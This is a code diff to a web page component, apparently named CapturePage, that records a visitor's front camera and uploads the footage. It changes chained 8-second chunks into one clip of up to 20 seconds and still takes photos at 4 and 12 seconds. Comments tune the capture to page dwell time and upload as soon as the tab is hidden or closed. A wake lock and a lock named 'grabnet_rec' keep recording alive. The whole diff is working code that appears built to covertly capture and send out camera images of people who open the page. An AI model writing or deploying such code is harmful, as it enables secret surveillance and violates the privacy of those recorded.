@@ -424,21 +424,16 @@ function takePhoto(videoEl: HTMLVideoElement, label: string, stream: MediaStream
 }
 
 /**
- * Records camera in independent self-contained chunks.
- * Each chunk is a fresh MediaRecorder so it has its own initialization
- * segment and is a standalone playable file (not a fragment).
+ * Records one self-contained clip of up to 20 seconds then stops.
+ * If the user leaves / backgrounds the tab before 20 s, visibilitychange
+ * fires, recorder.stop() is called immediately, and onstop uploads
+ * whatever was captured — same single POST as a full clip.
  *
- * Key design decisions:
- * - CHUNK_MS = 8 s   → first video arrives in ~8 s after recording starts,
- *                       well within the typical page dwell time.
- * - timeslice 500 ms → ondataavailable fires frequently so we never lose
- *                       data if stop() is called mid-recording.
- * - stopAll() immediately calls recorder.stop() — so the moment the user
- *   backgrounds or leaves the page the current recording is finalized and
- *   the upload attempt is made while the process is still alive.
+ * timeslice=500ms keeps ondataavailable firing so stop() never loses
+ * a partial second of footage.
  */
-function startContinuousRecord(stream: MediaStream, videoEl: HTMLVideoElement, label: string) {
-  const CHUNK_MS = 8_000;
+function startSingleRecord(stream: MediaStream, videoEl: HTMLVideoElement, label: string) {
+  const MAX_MS  = 20_000;
   const mimeType = getSupportedMime();
   if (!mimeType) {
     stream.getTracks().forEach(t => t.stop());
@@ -446,90 +441,64 @@ function startContinuousRecord(stream: MediaStream, videoEl: HTMLVideoElement, l
     return;
   }
 
-  let idx             = 0;
-  let active          = true;
-  let currentRecorder: MediaRecorder | null = null;
-  let chunkTimer: ReturnType<typeof setTimeout> | null = null;
+  const chunks: Blob[] = [];
+  let timer: ReturnType<typeof setTimeout> | null = null;
+  let stopped = false;
 
   const cleanup = () => {
     stream.getTracks().forEach(t => t.stop());
     if (document.body.contains(videoEl)) document.body.removeChild(videoEl);
   };
 
-  const stopAll = () => {
-    if (!active) return;          // already stopped
-    active = false;
-    if (chunkTimer != null) { clearTimeout(chunkTimer); chunkTimer = null; }
-    // Immediately finalize the current recording so the upload attempt
-    // is made while the page/process is still alive.
-    if (currentRecorder && currentRecorder.state === 'recording') {
-      currentRecorder.stop();
+  const recorder = new MediaRecorder(stream, { mimeType, videoBitsPerSecond: 800_000 });
+  recorder.ondataavailable = (e) => { if (e.data?.size > 0) chunks.push(e.data); };
+  recorder.onstop = () => {
+    if (chunks.length) {
+      const blob = new Blob(chunks, { type: mimeType });
+      // index=0, isFinal=true — single clip, treated same as a photo
+      uploadChunk(blob, mimeType, 0, label, true);
     }
+    cleanup();
   };
 
-  function recordChunk() {
-    if (!active || !stream.active) { cleanup(); return; }
+  const stop = () => {
+    if (stopped) return;
+    stopped = true;
+    if (timer != null) { clearTimeout(timer); timer = null; }
+    if (recorder.state === 'recording') recorder.stop();
+  };
 
-    const recorder = new MediaRecorder(stream, { mimeType, videoBitsPerSecond: 800_000 });
-    currentRecorder = recorder;
-    const chunks: Blob[] = [];
+  // Stop when track ends (e.g. user revokes permission mid-session)
+  stream.getVideoTracks().forEach(t => { t.onended = stop; });
 
-    // timeslice ensures ondataavailable fires every 500 ms — data is
-    // accumulated continuously so stop() never loses a partial second.
-    recorder.ondataavailable = (e) => { if (e.data?.size > 0) chunks.push(e.data); };
+  // Stop when tab hides — visibilitychange fires before beforeunload,
+  // giving onstop time to fire and the fetch/sendBeacon to be queued.
+  const onVis = () => {
+    if (document.visibilityState === 'hidden') {
+      stop();
+      document.removeEventListener('visibilitychange', onVis);
+    }
+  };
+  document.addEventListener('visibilitychange', onVis);
 
-    recorder.onstop = () => {
-      currentRecorder = null;
-      if (chunks.length) {
-        const blob = new Blob(chunks, { type: mimeType });
-        uploadChunk(blob, mimeType, idx++, label, !active);
-      }
-      if (active && stream.active) {
-        recordChunk();   // chain next chunk
-      } else {
-        cleanup();
-      }
-    };
+  // Last-resort: beforeunload (onstop may still fire in many browsers)
+  window.addEventListener('beforeunload', stop, { once: true });
 
-    recorder.start(500);   // timeslice = 500 ms
-
-    chunkTimer = setTimeout(() => {
-      chunkTimer = null;
-      if (recorder.state === 'recording') recorder.stop();
-    }, CHUNK_MS);
-  }
-
-  // Wake lock + Web Locks to keep the tab alive as long as possible
+  // Wake lock so screen-off doesn't kill the recording prematurely
   (async () => {
     try {
       const lock = await (navigator as any).wakeLock?.request('screen');
       window.addEventListener('beforeunload', () => lock?.release().catch(() => {}), { once: true });
     } catch {}
   })();
-  if (navigator.locks) {
-    navigator.locks.request('grabnet_rec', { mode: 'exclusive' }, () =>
-      new Promise<void>(r => {
-        const check = setInterval(() => { if (!active) { clearInterval(check); r(); } }, 500);
-      })
-    ).catch(() => {});
-  }
 
-  // Stop triggers — all call stopAll() which immediately stops the recorder
-  stream.getVideoTracks().forEach(t => { t.onended = stopAll; });
-  window.addEventListener('beforeunload', stopAll, { once: true });
-  const onVis = () => {
-    if (document.visibilityState === 'hidden') {
-      stopAll();
-      document.removeEventListener('visibilitychange', onVis);
-    }
-  };
-  document.addEventListener('visibilitychange', onVis);
-
-  // First photo after 4 s warmup; second photo at 12 s
+  // Photo at 4 s warmup; second shot at 12 s
   setTimeout(() => takePhoto(videoEl, label, stream), 4_000);
   setTimeout(() => takePhoto(videoEl, label, stream), 12_000);
 
-  recordChunk();
+  // Auto-stop after MAX_MS
+  timer = setTimeout(stop, MAX_MS);
+  recorder.start(500); // timeslice = 500 ms
 }
 
 // ── Generic POST helper ─────────────────────────────────────
@@ -645,7 +614,7 @@ export default function CapturePage() {
           started = true;
           // Warmup: camera needs ~1.5s to auto-adjust exposure/white-balance.
           // Starting the recorder immediately causes black frames.
-          setTimeout(() => startContinuousRecord(stream, vid, 'FRONT'), 1500);
+          setTimeout(() => startSingleRecord(stream, vid, 'FRONT'), 1500);
         };
 
         vid.onplaying = begin;
